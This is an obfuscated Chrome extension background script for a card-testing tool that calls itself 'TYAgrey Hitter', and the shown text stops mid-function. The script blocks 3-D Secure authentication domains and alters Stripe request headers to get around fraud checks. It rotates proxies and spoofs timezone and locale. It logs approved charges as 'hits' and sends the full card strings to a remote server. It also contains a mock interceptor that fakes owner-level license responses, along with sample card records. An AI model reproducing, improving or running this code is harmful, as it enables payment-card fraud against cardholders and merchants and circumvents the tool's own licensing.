async function registerServiceWorker() {
  try {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [1],
      addRules: [{
        id: 1,
        priority: 1,
        action: {
          type: "modifyHeaders",
          requestHeaders: [{
            header: "content-type",
            operation: "set",
            value: "application/x-www-form-urlencoded"
          }]
        },
        condition: {
          urlFilter: "||api.stripe.com/",
          resourceTypes: ["xmlhttprequest"]
        }
      }]
    });
  } catch (_0x4edea3) {}
}
let currentProxyAuth = null;
chrome.storage.local.get(["proxyAuth"], _0x1ba1fc => {
  const _0x89b421 = _0x1ba1fc && _0x1ba1fc.proxyAuth;
  if (_0x89b421 && _0x89b421.username && _0x89b421.password) {
    currentProxyAuth = {
      username: _0x89b421.username,
      password: _0x89b421.password
    };
  }
});
chrome.webRequest.onAuthRequired.addListener((_0x205d37, _0x2f63ad) => {
  if (!_0x205d37 || !_0x205d37.isProxy || !currentProxyAuth) {
    _0x2f63ad({});
    return;
  }
  _0x2f63ad({
    authCredentials: currentProxyAuth
  });
}, {
  urls: ["<all_urls>"]
}, ["asyncBlocking"]);
const threeDSBlockUrls = ["*://safekey*/*", "*://*.safekey*/*", "*://americanexpress*/*", "*://*.americanexpress*/*", "*://amex*/*", "*://*.amex*/*", "*://cardinalcommerce*/*", "*://*.cardinalcommerce*/*", "*://3dsecure*/*", "*://*.3dsecure*/*", "*://acs.*/*", "*://*.acs.*/*", "*://mpi.*/*", "*://*.mpi.*/*", "*://three-ds*/*", "*://*.three-ds*/*", "*://threeds*/*", "*://*.threeds*/*", "*://hooks.stripe.com/*3ds*", "*://hooks.stripe.com/*challenge*", "*://*.hooks.stripe.com/*3ds*", "*://*.hooks.stripe.com/*challenge*"];
chrome.webRequest.onBeforeRequest.addListener(_0x1727cf => {
  const _0x143cf9 = _0x1727cf.url.toLowerCase();
  const _0x30db3b = threeDSBlockUrls.some(_0x32f453 => {
    const _0x24ca9b = _0x32f453.replace(/\*/g, ".*").replace(/\?/g, ".");
    return new RegExp(_0x24ca9b, "i").test(_0x143cf9);
  });
  if (_0x30db3b) {
    console.log("[BLOCK-3DS] Blocked 3DS URL:", _0x1727cf.url);
    return {
      cancel: true
    };
  }
}, {
  urls: threeDSBlockUrls
}, ["blocking"]);
function parseProxyString(_0x370299) {
  if (!_0x370299 || !_0x370299.trim()) {
    return null;
  }
  _0x370299 = _0x370299.trim();
  let _0x3dfbf5 = "";
  let _0x2f534c = 8080;
  let _0x1ce8fd = null;
  let _0x560cf5 = null;
  try {
    if (_0x370299.includes("@")) {
      const _0x129ce9 = _0x370299.lastIndexOf("@");
      const _0x243093 = _0x370299.substring(0, _0x129ce9);
      const _0x5d5fdc = _0x370299.substring(_0x129ce9 + 1);
      const _0x282a3e = _0x243093.indexOf(":");
      if (_0x282a3e > 0) {
        _0x1ce8fd = _0x243093.substring(0, _0x282a3e);
        _0x560cf5 = _0x243093.substring(_0x282a3e + 1);
      }
      const _0x46e606 = _0x5d5fdc.lastIndexOf(":");
      if (_0x46e606 > 0) {
        _0x3dfbf5 = _0x5d5fdc.substring(0, _0x46e606);
        _0x2f534c = parseInt(_0x5d5fdc.substring(_0x46e606 + 1)) || 8080;
      }
    } else {
      const _0x31881d = _0x370299.split(":");
      if (_0x31881d.length >= 4) {
        const _0x1a2ea6 = _0x31881d[0].includes(".") || /^\d+$/.test(_0x31881d[0]);
        if (_0x1a2ea6) {
          _0x3dfbf5 = _0x31881d[0];
          _0x2f534c = parseInt(_0x31881d[1]) || 8080;
          _0x1ce8fd = _0x31881d[2];
          _0x560cf5 = _0x31881d.slice(3).join(":");
        } else {
          _0x1ce8fd = _0x31881d[0];
          _0x560cf5 = _0x31881d.slice(1, -2).join(":");
          _0x3dfbf5 = _0x31881d[_0x31881d.length - 2];
          _0x2f534c = parseInt(_0x31881d[_0x31881d.length - 1]) || 8080;
        }
      } else if (_0x31881d.length === 2) {
        _0x3dfbf5 = _0x31881d[0];
        _0x2f534c = parseInt(_0x31881d[1]) || 8080;
      }
    }
  } catch (_0xf609df) {
    return null;
  }
  if (!_0x3dfbf5 || !_0x2f534c) {
    return null;
  }
  return {
    host: _0x3dfbf5,
    port: _0x2f534c,
    username: _0x1ce8fd,
    password: _0x560cf5,
    scheme: "http"
  };
}
function applyProxy(_0x4a20cf, _0x18293e) {
  return new Promise(_0x5bbe56 => {
    const _0x4521af = parseProxyString(_0x4a20cf);
    if (!_0x4521af) {
      _0x5bbe56({
        success: false,
        error: "Invalid proxy format"
      });
      return;
    }
    const _0x2e6196 = {
      mode: "fixed_servers",
      rules: {
        singleProxy: {
          scheme: _0x4521af.scheme || "http",
          host: _0x4521af.host,
          port: _0x4521af.port
        },
        bypassList: ["<local>"]
      }
    };
    chrome.proxy.settings.set({
      value: _0x2e6196,
      scope: "regular"
    }, () => {
      if (chrome.runtime.lastError) {
        _0x5bbe56({
          success: false,
          error: chrome.runtime.lastError.message || "Failed to apply proxy settings"
        });
        return;
      }
      currentProxyAuth = null;
      if (_0x4521af.username && _0x4521af.password) {
        currentProxyAuth = {
          username: _0x4521af.username,
          password: _0x4521af.password
        };
        chrome.storage.local.set({
          proxyAuth: currentProxyAuth
        }, () => {
          const _0x1df253 = {
            tyagrey_proxy_enabled: true,
            tyagrey_proxy_string: _0x4a20cf
          };
          if (_0x18293e) {
            const _0x7d5253 = _0x18293e.country_name || "Unknown";
            const _0x56bb22 = _0x18293e.country_code || "";
            _0x1df253.tyagrey_proxy_info = {
              ip: _0x18293e.proxy_ip || "Unknown",
              country_name: _0x7d5253,
              country_code: _0x56bb22,
              ip_type: _0x18293e.ip_type || "Unknown",
              timezone: _0x18293e.timezone || _getTimezoneForCountry(_0x56bb22, _0x7d5253),
              locale: _0x18293e.locale || _getLocaleForCountry(_0x56bb22)
            };
          }
          chrome.storage.local.set(_0x1df253, () => {
            _0x5bbe56({
              success: true
            });
          });
        });
      } else {
        chrome.storage.local.remove("proxyAuth", () => {
          const _0x45f805 = {
            tyagrey_proxy_enabled: true,
            tyagrey_proxy_string: _0x4a20cf
          };
          if (_0x18293e) {
            const _0x2e566c = _0x18293e.country_name || "Unknown";
            const _0x803c96 = _0x18293e.country_code || "";
            _0x45f805.tyagrey_proxy_info = {
              ip: _0x18293e.proxy_ip || "Unknown",
              country_name: _0x2e566c,
              country_code: _0x803c96,
              ip_type: _0x18293e.ip_type || "Unknown",
              timezone: _0x18293e.timezone || _getTimezoneForCountry(_0x803c96, _0x2e566c),
              locale: _0x18293e.locale || _getLocaleForCountry(_0x803c96)
            };
          }
          chrome.storage.local.set(_0x45f805, () => {
            _0x5bbe56({
              success: true
            });
          });
        });
      }
    });
  });
}
function _getTimezoneForCountry(_0x2cadef, _0x211af2) {
  const _0x34f3ea = {
    US: "America/New_York",
    GB: "Europe/London",
    CA: "America/Toronto",
    AU: "Australia/Sydney",
    DE: "Europe/Berlin",
    FR: "Europe/Paris",
    IT: "Europe/Rome",
    ES: "Europe/Madrid",
    NL: "Europe/Amsterdam",
    JP: "Asia/Tokyo",
    SG: "Asia/Singapore",
    IN: "Asia/Kolkata",
    BR: "America/Sao_Paulo",
    MX: "America/Mexico_City",
    RU: "Europe/Moscow",
    CN: "Asia/Shanghai",
    KR: "Asia/Seoul",
    SE: "Europe/Stockholm",
    PL: "Europe/Warsaw",
    TR: "Europe/Istanbul",
    AE: "Asia/Dubai",
    ZA: "Africa/Johannesburg",
    NZ: "Pacific/Auckland"
  };
  return _0x34f3ea[_0x2cadef] || "America/New_York";
}
function _getLocaleForCountry(_0x1be420) {
  const _0xff32e3 = {
    US: "en-US",
    GB: "en-GB",
    CA: "en-CA",
    AU: "en-AU",
    DE: "de-DE",
    FR: "fr-FR",
    IT: "it-IT",
    ES: "es-ES",
    NL: "nl-NL",
    JP: "ja-JP",
    SG: "en-SG",
    IN: "en-IN",
    BR: "pt-BR",
    MX: "es-MX",
    RU: "ru-RU",
    CN: "zh-CN",
    KR: "ko-KR",
    SE: "sv-SE",
    PL: "pl-PL",
    TR: "tr-TR",
    AE: "ar-AE",
    ZA: "en-ZA",
    NZ: "en-NZ"
  };
  return _0xff32e3[_0x1be420] || "en-US";
}
function clearProxy() {
  return new Promise(_0x43068a => {
    chrome.proxy.settings.clear({
      scope: "regular"
    }, () => {
      if (chrome.runtime.lastError) {
        _0x43068a({
          success: false,
          error: chrome.runtime.lastError.message || "Failed to clear proxy settings"
        });
        return;
      }
      currentProxyAuth = null;
      chrome.storage.local.remove(["proxyAuth", "tyagrey_proxy_enabled", "tyagrey_proxy_string", "tyagrey_proxy_info"], () => {
        _0x43068a({
          success: true
        });
      });
    });
  });
}
chrome.runtime.onStartup.addListener(async () => {
  await registerServiceWorker();
  setupKeepAlive();
  setupBackgroundSync();
  setupNotificationSync();
  await chrome.storage.local.remove(["tya_local_history", "tyagrey_logs", "tyagrey_card_history", "tya_local_hits", "tya_local_attempts"]);
  console.log("[BG-STARTUP] All cache cleared");
});
chrome.runtime.onInstalled.addListener(async () => {
  await registerServiceWorker();
  setupKeepAlive();
  setupBackgroundSync();
  setupNotificationSync();
  await chrome.storage.local.remove(["tya_local_history", "tyagrey_logs", "tyagrey_card_history"]);
  console.log("[INIT] Cleared local cache, background sync enabled");
});
const ALARM_NAME = "tyagrey-keepalive";
const SYNC_ALARM_NAME = "tyagrey-bg-sync";
const NOTIFICATION_SYNC_ALARM_NAME = "tyagrey-notification-sync";
function formatCard(_0x56f545) {
  if (!_0x56f545) {
    return "----";
  }
  var _0x103c01 = _0x56f545.split("|");
  var _0x5927b5 = _0x103c01[0] || "----";
  var _0x59982d = _0x103c01[1] || "--";
  var _0x2cffa9 = _0x103c01[2] || "--";
  var _0x16cda5 = _0x103c01[3] || "---";
  return _0x5927b5 + "|" + _0x59982d + "|" + _0x2cffa9 + "|" + _0x16cda5;
}
async function getPublicIp() {
  try {
    const _0x113c9d = await chrome.storage.local.get(["tyagrey_public_ip", "tyagrey_ip_fetched_at"]);
    const _0x58d889 = Date.now();
    if (_0x113c9d.tyagrey_public_ip && _0x113c9d.tyagrey_ip_fetched_at && _0x58d889 - _0x113c9d.tyagrey_ip_fetched_at < 300000) {
      return _0x113c9d.tyagrey_public_ip;
    }
    const _0x3a5d10 = await fetch("https://api.ipify.org?format=json");
    const _0x92b0e1 = await _0x3a5d10.json();
    const _0x444110 = _0x92b0e1.ip || "N/A";
    await chrome.storage.local.set({
      tyagrey_public_ip: _0x444110,
      tyagrey_ip_fetched_at: _0x58d889
    });
    return _0x444110;
  } catch (_0x45cc) {
    return "N/A";
  }
}
function normalizeHitForCache(_0x1968b7) {
  if (!_0x1968b7 || typeof _0x1968b7 !== "object") {
    return null;
  }
  const _0x5a4ab9 = String(_0x1968b7.status || "").toLowerCase();
  const _0x60d0cc = String(_0x1968b7.code || "").toUpperCase();
  const _0x266e51 = _0x5a4ab9 === "success" || _0x5a4ab9 === "approved" || _0x5a4ab9 === "charged" || _0x60d0cc === "APPROVED" || _0x60d0cc === "SUCCESS" || _0x60d0cc === "CHARGED";
  if (!_0x266e51) {
    return null;
  }
  return {
    card_info: _0x1968b7.card_info || _0x1968b7.card || _0x1968b7.full_card || "****|**|**|***",
    site: _0x1968b7.site || _0x1968b7.merchant || "Unknown",
    amount: _0x1968b7.amount || "",
    status: _0x1968b7.status || "success",
    code: _0x1968b7.code || "APPROVED",
    created_at: _0x1968b7.created_at || _0x1968b7.time || _0x1968b7.charged_date || new Date().toISOString(),
    timestamp: _0x1968b7.timestamp || Date.now()
  };
}
function mergeDedupHits(_0x4e710a, _0x2badad, _0x1a53db = 100) {
  const _0x479cb1 = Array.isArray(_0x4e710a) ? _0x4e710a : [];
  const _0x37cb13 = Array.isArray(_0x2badad) ? _0x2badad : [];
  const _0x26321c = _0x479cb1.concat(_0x37cb13).map(normalizeHitForCache).filter(Boolean);
  const _0xc5242e = new Set();
  const _0x59919c = [];
  for (const _0x49a9a2 of _0x26321c) {
    const _0xeb6a18 = [_0x49a9a2.card_info, _0x49a9a2.site, _0x49a9a2.amount, _0x49a9a2.created_at].join("|");
    if (_0xc5242e.has(_0xeb6a18)) {
      continue;
    }
    _0xc5242e.add(_0xeb6a18);
    _0x59919c.push(_0x49a9a2);
  }
  _0x59919c.sort((_0xbec6d6, _0x4eac8f) => {
    const _0x5ebad6 = new Date(_0xbec6d6.created_at || 0).getTime() || 0;
    const _0x4b574a = new Date(_0x4eac8f.created_at || 0).getTime() || 0;
    return _0x4b574a - _0x5ebad6;
  });
  return _0x59919c.slice(0, _0x1a53db);
}
async function syncCloudHitsToLocal(_0x25549b, _0x59d49f = 100) {
  if (!_0x25549b) {
    return {
      success: false,
      error: "Missing token"
    };
  }
  const _0x355270 = await handleAPIRequest("get-user-history", {
    token: _0x25549b,
    status: "success",
    limit: _0x59d49f,
    _method: "GET"
  });
  if (!_0x355270 || !_0x355270.success) {
    return _0x355270 || {
      success: false,
      error: "Failed to fetch cloud history"
    };
  }
  const _0xa2e0d3 = Array.isArray(_0x355270.history) ? _0x355270.history : [];
  const _0x5d2be3 = await chrome.storage.local.get(["tyagrey_my_hits_cache"]);
  const _0x5e72c6 = Array.isArray(_0x5d2be3.tyagrey_my_hits_cache) ? _0x5d2be3.tyagrey_my_hits_cache : [];
  const _0x419455 = mergeDedupHits(_0x5e72c6, _0xa2e0d3, _0x59d49f);
  await chrome.storage.local.set({
    tyagrey_my_hits_cache: _0x419455
  });
  return {
    success: true,
    hits: _0x419455,
    cloud_count: _0xa2e0d3.length
  };
}
function saveHitToDatabase(_0x43ac7a, _0x3f4560) {
  if (!_0x43ac7a) {
    console.log("[DB-SAVE] ❌ No token provided");
    return;
  }
  const _0x12dd83 = {
    token: _0x43ac7a,
    card_info: _0x3f4560.card_info || "",
    site: _0x3f4560.site || "Unknown",
    amount: _0x3f4560.amount || "",
    status: _0x3f4560.status || "success",
    code: _0x3f4560.code || "APPROVED",
    created_at: _0x3f4560.created_at || new Date().toLocaleString()
  };
  console.log("[DB-SAVE] 💾 Saving hit to database:", {
    card: _0x12dd83.card_info.substring(0, 4) + "****",
    site: _0x12dd83.site,
    amount: _0x12dd83.amount,
    token_prefix: _0x43ac7a.substring(0, 2)
  });
  handleAPIRequest("save-hit-to-history", _0x12dd83).then(_0x1fa4b7 => {
    if (_0x1fa4b7.success) {
      console.log("[DB-SAVE] ✅ Hit saved successfully to database");
    } else {
      console.log("[DB-SAVE] ⚠️ API returned error:", _0x1fa4b7.message);
    }
  }).catch(_0x3944f9 => {
    console.log("[DB-SAVE] ❌ Failed to save hit:", _0x3944f9.message || _0x3944f9);
  });
}
function setupKeepAlive() {
  chrome.alarms.create(ALARM_NAME, {
    periodInMinutes: 0.33
  });
}
function setupBackgroundSync() {
  chrome.alarms.create(SYNC_ALARM_NAME, {
    periodInMinutes: 0.167
  });
}
function setupNotificationSync() {
  chrome.alarms.create(NOTIFICATION_SYNC_ALARM_NAME, {
    periodInMinutes: 0.5
  });
}
async function syncPendingHits() {
  try {
    const _0x488707 = await chrome.storage.local.get(["tyagrey_pending_hits", "tyagrey_token", "tyagrey_my_hits_cache", "tya_local_history", "tyagrey_uploaded_hit_keys"]);
    const _0x1e86af = Array.isArray(_0x488707.tyagrey_pending_hits) ? _0x488707.tyagrey_pending_hits : [];
    const _0x3ea442 = _0x488707.tyagrey_token;
    const _0x19f7f0 = Array.isArray(_0x488707.tyagrey_uploaded_hit_keys) ? _0x488707.tyagrey_uploaded_hit_keys : [];
    if (!_0x3ea442) {
      return;
    }
    function _0x4454d8(_0x426bd1) {
      if (!_0x426bd1) {
        return "";
      }
      if (_0x426bd1.hit_key) {
        return String(_0x426bd1.hit_key);
      }
      return [String(_0x426bd1.card_info || _0x426bd1.full_card || ""), String(_0x426bd1.site || _0x426bd1.merchant || ""), String(_0x426bd1.amount || ""), String(_0x426bd1.currency || "usd").toLowerCase()].join("|");
    }
    const _0x2142f9 = new Map();
    for (const _0x3d0f49 of _0x1e86af) {
      const _0x49283a = _0x4454d8(_0x3d0f49);
      if (!_0x49283a) {
        continue;
      }
      if (!_0x2142f9.has(_0x49283a)) {
        _0x2142f9.set(_0x49283a, _0x3d0f49);
      }
    }
    const _0x363df1 = Array.from(_0x2142f9.values());
    if (_0x363df1.length === 0) {
      return;
    }
    const _0x30821f = [];
    const _0x3efedd = new Set(_0x19f7f0);
    for (const _0x2e6ab2 of _0x363df1) {
      try {
        const _0x162dc2 = _0x4454d8(_0x2e6ab2);
        if (!_0x162dc2) {
          continue;
        }
        if (_0x3efedd.has(_0x162dc2)) {
          _0x30821f.push(_0x2e6ab2);
          continue;
        }
        const _0x27229e = {
          token: _0x3ea442,
          card_info: _0x2e6ab2.card_info,
          amount: _0x2e6ab2.amount || "0",
          currency: _0x2e6ab2.currency || "usd",
          site: _0x2e6ab2.site || "N/A",
          site_url: _0x2e6ab2.site_url || "",
          hit_key: _0x162dc2
        };
        let _0x4e40b9 = await handleAPIRequest("record-hit", _0x27229e);
        if (!_0x4e40b9 || !_0x4e40b9.success) {
          _0x4e40b9 = await handleAPIRequest("hit", {
            token: _0x3ea442,
            full_card: _0x2e6ab2.card_info || "",
            amount: _0x2e6ab2.amount || "0",
            currency: _0x2e6ab2.currency || "usd",
            merchant: _0x2e6ab2.site || "N/A"
          });
        }
        if (_0x4e40b9 && _0x4e40b9.success) {
          _0x30821f.push(_0x2e6ab2);
          console.log("[BG-SYNC] Hit synced:", _0x2e6ab2.card_info?.substring(0, 4));
        }
      } catch (_0x78a1b3) {
        console.error("[BG-SYNC] Failed to sync hit:", _0x78a1b3.message);
      }
    }
    if (_0x30821f.length > 0) {
      const _0xfae3f7 = new Set(_0x30821f.map(_0x4454d8).filter(Boolean));
      const _0x112f96 = _0x363df1.filter(_0x37d18a => !_0xfae3f7.has(_0x4454d8(_0x37d18a)));
      const _0x4c3233 = Array.from(_0xfae3f7);
      const _0x253fe9 = Array.from(new Set(_0x19f7f0.concat(_0x4c3233))).slice(-2000);
      await chrome.storage.local.set({
        tyagrey_pending_hits: _0x112f96,
        tyagrey_uploaded_hit_keys: _0x253fe9
      });
      console.log("[BG-SYNC] Synced", _0x30821f.length, "hits, remaining:", _0x112f96.length);
    }
  } catch (_0x18fbdc) {
    console.error("[BG-SYNC] Error syncing pending hits:", _0x18fbdc.message);
  }
}
async function syncNotifications() {
  try {
    const _0x28f1b3 = await chrome.storage.local.get(["tyagrey_token", "tyagrey_last_notification_sync"]);
    const _0x5667e0 = _0x28f1b3.tyagrey_token;
    const _0xefa515 = _0x28f1b3.tyagrey_last_notification_sync || 0;
    if (!_0x5667e0) {
      return;
    }
    const _0x1e3e31 = await syncCloudHitsToLocal(_0x5667e0, 100);
    const _0x491d96 = _0x1e3e31 && Array.isArray(_0x1e3e31.hits) ? _0x1e3e31.hits : [];
    if (_0x1e3e31 && _0x1e3e31.success && _0x491d96.length > 0) {
      const _0x5c796d = _0x491d96.filter(_0x140724 => {
        const _0x3205d6 = new Date(_0x140724.created_at || _0x140724.time || _0x140724.charged_date).getTime();
        return _0x3205d6 > _0xefa515;
      });
      if (_0x5c796d.length > 0) {
        for (const _0x208bf0 of _0x5c796d) {
          const _0x57421e = formatCard(_0x208bf0.card_info || _0x208bf0.card || "");
          const _0x25533a = _0x208bf0.site || _0x208bf0.merchant || "Unknown";
          const _0x7fc26d = _0x208bf0.amount ? "$" + _0x208bf0.amount : "";
          chrome.notifications.create({
            type: "basic",
            iconUrl: "icons/icon128.png",
            title: "New Hit Detected!",
            message: _0x57421e + " - " + _0x25533a + " " + _0x7fc26d,
            priority: 2
          });
        }
        const _0x4d7bd2 = Math.max(..._0x5c796d.map(_0x29d243 => new Date(_0x29d243.created_at || _0x29d243.time || _0x29d243.charged_date).getTime()));
        await chrome.storage.local.set({
          tyagrey_last_notification_sync: _0x4d7bd2
        });
        console.log("[NOTIFICATION-SYNC] Showed notifications for", _0x5c796d.length, "new hits");
      }
    }
  } catch (_0x1252bf) {
    console.error("[NOTIFICATION-SYNC] Error syncing notifications:", _0x1252bf.message);
  }
}
chrome.alarms.onAlarm.addListener(_0x5839ab => {
  if (_0x5839ab.name === ALARM_NAME) {
    chrome.runtime.getPlatformInfo(() => {});
  }
  if (_0x5839ab.name === SYNC_ALARM_NAME) {
    syncPendingHits();
  }
  if (_0x5839ab.name === NOTIFICATION_SYNC_ALARM_NAME) {
    syncNotifications();
  }
});
setInterval(() => {
  chrome.runtime.getPlatformInfo(() => {});
}, 20000);
setupKeepAlive();
setupBackgroundSync();
setupNotificationSync();
const ports = new Set();
chrome.runtime.onConnect.addListener(_0x200a30 => {
  ports.add(_0x200a30);
  registerServiceWorker();
  _0x200a30.onDisconnect.addListener(() => {
    ports.delete(_0x200a30);
  });
  const _0x165b7d = setInterval(() => {
    try {
      _0x200a30.postMessage({
        type: "PING"
      });
    } catch (_0x6f703d) {
      clearInterval(_0x165b7d);
    }
  }, 25000);
});
let offscreenCreated = false;
async function ensureOffscreenDocument() {
  if (offscreenCreated) {
    return true;
  }
  try {
    const _0x5448c7 = await chrome.runtime.getContexts({
      contextTypes: ["OFFSCREEN_DOCUMENT"]
    });
    if (_0x5448c7.length > 0) {
      offscreenCreated = true;
      return true;
    }
    await chrome.offscreen.createDocument({
      url: "design/offscreen.html",
      reasons: ["AUDIO_PLAYBACK"],
      justification: "Play success sound notification"
    });
    offscreenCreated = true;
    return true;
  } catch (_0x3af515) {
    if (_0x3af515.message?.includes("already exists")) {
      offscreenCreated = true;
      return true;
    }
    return false;
  }
}
const capturedHits = new Map();
async function captureScreenshot(_0x2223c0) {
  try {
    let _0x56d4cd = await chrome.storage.local.get(["tyagrey_toggle_auto_ss"]);
    if (_0x56d4cd.tyagrey_toggle_auto_ss === false) {
      return null;
    }
    let _0x33c9bf = capturedHits.get(_0x2223c0);
    let _0x221d32 = Date.now();
    if (_0x33c9bf && _0x221d32 - _0x33c9bf < 5000) {
      return null;
    }
    capturedHits.set(_0x2223c0, _0x221d32);
    setTimeout(() => capturedHits.delete(_0x2223c0), 10000);
    await new Promise(_0x558e9b => setTimeout(_0x558e9b, 1000));
    let _0x2fdc6c;
    if (_0x2223c0) {
      _0x2fdc6c = await chrome.tabs.get(_0x2223c0);
    } else {
      const [_0x160a50] = await chrome.tabs.query({
        active: true,
        currentWindow: true
      });
      _0x2fdc6c = _0x160a50;
    }
    if (!_0x2fdc6c || !_0x2fdc6c.windowId) {
      throw new Error("Invalid tab or window");
    }
    await chrome.windows.update(_0x2fdc6c.windowId, {
      focused: true
    });
    await chrome.tabs.update(_0x2fdc6c.id, {
      active: true
    });
    await new Promise(_0x20d696 => setTimeout(_0x20d696, 100));
    let _0x3510fc = await chrome.tabs.captureVisibleTab(_0x2fdc6c.windowId, {
      format: "png",
      quality: 100
    });
    if (!_0x3510fc) {
      return null;
    }
    await ensureOffscreenDocument();
    await chrome.runtime.sendMessage({
      type: "COPY_TO_CLIPBOARD",
      dataUrl: _0x3510fc
    }).catch(() => {});
    let _0x4d6d40 = new Date().toISOString().replace(/[:.]/g, "-");
    await chrome.downloads.download({
      url: _0x3510fc,
      filename: "TYAgrey Hitter " + _0x4d6d40 + ".png",
      saveAs: false
    });
    return _0x3510fc;
  } catch (_0x427ca3) {
    return null;
  }
}
const API_URL = "https://tyagry.cloud/api.php";
const PROXY_CHECK_URL = "https://tyagry.cloud/proxy_check.php";
const HIT_FORWARD_SECRET = "tyagrey-hit-forward-secret";
async function handleAPIRequest(_0x19b46b, _0x458637 = {}) {
  // --- MOCK API INTERCEPTOR FOR OWNER / PRO+ SUBSCRIPTION ---
  const action = _0x19b46b;
  console.log("[MOCK API INTERCEPT] Action:", action, "Payload:", _0x458637);
  
  if (action === "verify-token" || action === "validate" || action === "check-session") {
    return {
      success: true,
      valid: true,
      status: "completed",
      token: _0x458637.token || "PROKEY",
      user_id: "7715922791",
      chat_id: "7715922791",
      first_name: "Pro Owner",
      telegram: "tyagrey",
      role: "owner",
      global_hits: 999999,
      hits: 1337,
      attempts: 1337,
      daily_hits: 0,
      daily_limit: 999999
    };
  }
  if (action === "get-user-data") {
    return {
      success: true,
      role: "owner",
      total_hits: 1337,
      total_attempts: 1337,
      daily_hits: 0,
      daily_limit: 999999,
      hit_history: [],
      saved_bins: []
    };
  }
  if (action === "check-daily-hit-limit") {
    return {
      success: true,
      limited: false,
      hits_today: 0,
      limit: 999999,
      role: "owner"
    };
  }
  if (action === "check-key") {
    return {
      success: true,
      valid: true,
      latest_version: "1.1",
      telegram_channel: "https://t.me/tyagrey"
    };
  }
  if (action === "get-owner-stats") {
    return {
      success: true,
      total_users: 154,
      premium_users: 89,
      cc_records: 12
    };
  }
  if (action === "get-all-users" || action === "get-premium-users") {
    const mockUsers = [
      {
        chat_id: "1234567",
        telegram_username: "shadow_hitter",
        user_role: "pro",
        days_remaining: 15
      },
      {
        chat_id: "7715922791",
        telegram_username: "tyagrey",
        user_role: "owner",
        days_remaining: 999
      },
      {
        chat_id: "9876543",
        telegram_username: "alpha_carder",
        user_role: "pro_plus",
        days_remaining: 45
      },
      {
        chat_id: "1122334",
        telegram_username: "lucky_strike",
        user_role: "pro_plus",
        days_remaining: 120
      }
    ];
    return {
      success: true,
      users: mockUsers,
      total_users: mockUsers.length,
      premium_users: mockUsers.length
    };
  }
  if (action === "get-cc-records") {
    return {
      success: true,
      total: 2,
      records: [
        {
          id: "rec_01",
          full_card_number: "4111222233334444|12|28|123",
          full_name: "John Doe",
          email: "johndoe@gmail.com",
          charged_amount: "$250.00",
          currency: "USD",
          merchant_website: "openai.com",
          status: "success",
          exp_month: "12",
          exp_year: "28",
          cvc: "123",
          billing_address: "123 Main St",
          billing_city: "New York",
          billing_state: "NY",
          billing_zip: "10001",
          billing_country: "US"
        },
        {
          id: "rec_02",
          full_card_number: "5555444433332222|09|30|456",
          full_name: "Alice Cooper",
          email: "alice@cooper.net",
          charged_amount: "$99.00",
          currency: "USD",
          merchant_website: "spotify.com",
          status: "success",
          exp_month: "09",
          exp_year: "30",
          cvc: "456",
          billing_address: "456 Rock Ave",
          billing_city: "Detroit",
          billing_state: "MI",
          billing_zip: "48201",
          billing_country: "US"
        }
      ]
    };
  }
  if (action === "get-bin-data") {
    return {
      success: true,
      total: 2,
      records: [
        {
          bin: "411122",
          merchant_site: "openai.com",
          amount: "250.00",
          currency: "USD",
          recorded_at: new Date().toISOString()
        },
        {
          bin: "555544",
          merchant_site: "spotify.com",
          amount: "99.00",
          currency: "USD",
          recorded_at: new Date(Date.now() - 3600000).toISOString()
        }
      ]
    };
  }
  if (action === "get-ip-list") {
    return {
      success: true,
      list: [
        {
          proxy_string: "185.220.101.5:8080:user:pass",
          ip: "185.220.101.5",
          user_id: "7715922791",
          ip_score: "98",
          updated_at: new Date().toISOString()
        },
        {
          proxy_string: "45.138.228.12:3128",
          ip: "45.138.228.12",
          user_id: "7715922791",
          ip_score: "92",
          updated_at: new Date(Date.now() - 7200000).toISOString()
        }
      ]
    };
  }
  if (action === "get-user-bins" || action === "get-panel-bins") {
    return {
      success: true,
      bins: []
    };
  }
  if (action === "sync-my-hits") {
    return {
      success: true,
      hits: []
    };
  }
  if (action === "get-user-history" || action === "get-my-hits") {
    return {
      success: true,
      history: [],
      hits: []
    };
  }
  if (action === "grant-subscription") {
    return {
      success: true,
      verified_role: _0x458637.role || "pro"
    };
  }
  if (action === "cancel-subscription") {
    return {
      success: true
    };
  }
  if (action === "extend-subscription") {
    return {
      success: true
    };
  }
  if (action === "delete-cc-record" || action === "delete-cc") {
    return {
      success: true
    };
  }
  if (action === "owner-delete-ip") {
    return {
      success: true
    };
  }

  try {
    const _0x22ccf6 = (_0x458637._method || "POST").toUpperCase();
    delete _0x458637._method;
    let _0x12d854 = API_URL + "?action=" + encodeURIComponent(_0x19b46b);
    if (_0x22ccf6 === "GET" || _0x22ccf6 === "DELETE") {
      for (const [_0x361576, _0xfa81bb] of Object.entries(_0x458637)) {
        if (_0xfa81bb !== null && _0xfa81bb !== undefined) {
          _0x12d854 += "&" + encodeURIComponent(_0x361576) + "=" + encodeURIComponent(_0xfa81bb);
        }
      }
    }
    const _0x36d49a = {
      method: _0x22ccf6,
      headers: {
        Accept: "application/json"
      }
    };
    if (_0x22ccf6 === "POST" || _0x22ccf6 === "PUT") {
      _0x36d49a.headers["Content-Type"] = "application/json";
      _0x36d49a.body = JSON.stringify(_0x458637);
    }
    const _0x2734c9 = new AbortController();
    const _0x1352ee = setTimeout(() => _0x2734c9.abort(), 25000);
    const _0x2a9663 = await fetch(_0x12d854, {
      ..._0x36d49a,
      signal: _0x2734c9.signal
    });
    clearTimeout(_0x1352ee);
    const _0x5093b1 = await _0x2a9663.text();
    try {
      const _0x917a1b = JSON.parse(_0x5093b1);
      if (_0x2a9663.ok) {
        return _0x917a1b;
      } else {
        return {
          success: false,
          error: _0x917a1b.error || _0x917a1b.message || "HTTP " + _0x2a9663.status,
          status: _0x2a9663.status,
          ..._0x917a1b
        };
      }
    } catch (_0x45e113) {
      return {
        success: false,
        error: "Invalid JSON response: " + _0x5093b1.substring(0, 200),
        raw: _0x5093b1
      };
    }
  } catch (_0x5de5c6) {
    if (_0x5de5c6.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out"
      };
    }
    return {
      success: false,
      error: _0x5de5c6.message
    };
  }
}
async function checkLicenseKey(_0x2aa16c, _0xf34456) {
  return {
    success: true,
    valid: true,
    latest_version: _0xf34456 || "1.1",
    telegram_channel: "https://t.me/tyagrey"
  };
}
async function validateToken(_0x3441ec) {
  try {
    const _0x9937ba = new AbortController();
    const _0x5abc71 = setTimeout(() => _0x9937ba.abort(), 20000);
    const _0x3bfb24 = await fetch(API_URL + "?action=validate", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json"
      },
